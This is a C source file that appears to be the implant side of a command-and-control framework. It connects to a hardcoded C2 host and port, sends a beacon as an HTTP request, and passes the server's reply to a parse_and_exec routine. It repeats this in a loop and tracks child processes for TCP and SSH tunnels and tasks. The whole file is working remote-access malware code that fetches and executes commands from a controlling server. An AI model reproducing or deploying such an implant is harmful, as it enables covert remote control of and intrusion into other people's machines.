#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <signal.h>
#include <wait.h>

#include "beacon.h"
#include "command.h"
#include "colors.h"

#define RHOST "127.0.0.1"
#define RPORT 8000
#define RPORT_STR "8000"
#define BEACON_RESP_MAX_SIZE 2048

#define ABORT (-1)
#define RETRY_LATER 0
#define OK 1

int timeout = 15;		// seconds
extern struct process tcp_tunnel;
extern struct process ssh_tunnel;
extern struct process task;

static void handle_sigchld(int sig)
{
	int saved_errno = errno;
	int pid;
	while ((pid = waitpid(-1, 0, WNOHANG)) > 0) {	// Possibly save exit status
		if (pid == tcp_tunnel.pid) {
			tcp_tunnel.is_alive = 0;
		} else if (pid == ssh_tunnel.pid) {
			ssh_tunnel.is_alive = 0;
		} else if (pid == task.pid) {
			task.is_alive = 0;
		}
	}
	errno = saved_errno;
}

static int register_sigchld_handler()
{
	struct sigaction sa;
	sa.sa_handler = &handle_sigchld;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
	if (sigaction(SIGCHLD, &sa, 0) == -1)
		return -1;

	return 0;
}

int connect_to_c2(const char *host, int port)
{
	int sockfd;

	/* Set host address and port */
	printf("[*] Setting c2 address and port...");
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(RPORT);
	if (inet_pton(AF_INET, RHOST, &serv_addr.sin_addr) <= 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Creating socket...");
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	/* Set receive timeout on socket */
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
		       sizeof(struct timeval)) == -1) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Connecting to c2 server...");
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
	    0) {
		printf(RED("failed\n"));
		return RETRY_LATER;
	}
	printf("done\n");

	return sockfd;
}

char *get_beacon_resp(int sockfd)
{
	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
	if (buf == NULL) {
		printf("malloc\n");
		return NULL;
	}

	/* Should read HTTP header to make sure the entire reply
	   is received before moving on */
	printf("[*] Waiting for c2 server to reply...");
	fflush(stdout);
	int received = 0;
	int tot_read = 0;
	ssize_t numread = 0;
	char *pos = buf;
	do {
		numread = recv(sockfd, pos, BEACON_RESP_MAX_SIZE - tot_read, 0);
		if (numread > 0) {
			tot_read += numread;
			pos += numread;
			//printf("received %d bytes\n", numread);
			received = 1;
		} else if (numread == 0) {
			printf("received %d bytes\n", tot_read);
		} else if (numread == -1) {
			if (errno == EAGAIN && errno == EWOULDBLOCK) {
				printf(RED("timed out\n"));
			} else {
				printf(RED("error\n"));
			}
		}
	} while (numread > 0);

	return buf;
	//else
	//      free(buf);
}

int send_beacon(int sockfd, char *request, size_t request_len)
{
	if (request == NULL || request_len == 0)
		return ABORT;	/* If no beacon could be retrieved, abort */

	printf("[*] Sending HTTP request to server:\n%s\n", request);

	int numsent;
	char *pos = request;
	while (request_len > 0) {
		numsent = send(sockfd, pos, request_len, 0);
		if (numsent >= 0) {
			request_len -= numsent;
			if (request_len)
				pos += numsent;
		} else {
			printf("[*] Error: %s\n", strerror(errno));
			printf("[*] Could not send beacon, will retry\n");
			printf("[*] Closing socket\n");
			return RETRY_LATER;
		}
	}

	printf("[*] Beacon sent\n");

	return OK;

	//printf("[*] Closing socket\n");
	//close(sockfd);
}

int main(int argc, char *argv[])
{
	printf("[*] Registering SIGCHLD handler for new process...");
	if (register_sigchld_handler() == -1) {
		printf(RED("failed\n"));
		return -1;
	}
	printf("done\n");

	printf("[*] Acquiring beacon...");
	char *beacon = get_beacon();
	if (beacon == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done:\n") "%s", beacon);

#define HTTP_REQ_MAX_SIZE 2048
	printf("[*] Building HTTP request...");
	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
	if (http_req == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
		"Host: " RHOST ":" RPORT_STR "\r\n"
		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
	printf(GREEN("done\n"));

	while (1) {
		int sockfd, ret;
		ret = connect_to_c2(RHOST, RPORT);
		if (ret == ABORT) {
			/* We don't have a working socket */
			break;
		} else if (ret == RETRY_LATER) {
			/* We don't have a working socket */
			sleep(timeout);
			continue;
		}
		/* We have a working socket */
		sockfd = ret;

		ret = send_beacon(sockfd, http_req, strlen(http_req));
		if (ret == ABORT) {
			close(sockfd);
			break;
		} else if (ret == RETRY_LATER) {
			close(sockfd);
			printf(YELLOW
			       ("[*] Sleep %d seconds before retrying..."),
			       timeout);
			fflush(stdout);
			sleep(timeout);
			printf("done\n");
		} else {
			char *response = get_beacon_resp(sockfd);
			if (response) {
				printf("[*] Server response:\n%s\n", response);
				printf(BLUE("[*] Preparing execution...\n"));
				parse_and_exec(response);
				printf(BLUE("[*] Resuming main loop\n"));
				free(response);
				sleep(timeout);
			}
		}
	}

	free(beacon);
	free(http_req);

	return 0;
}
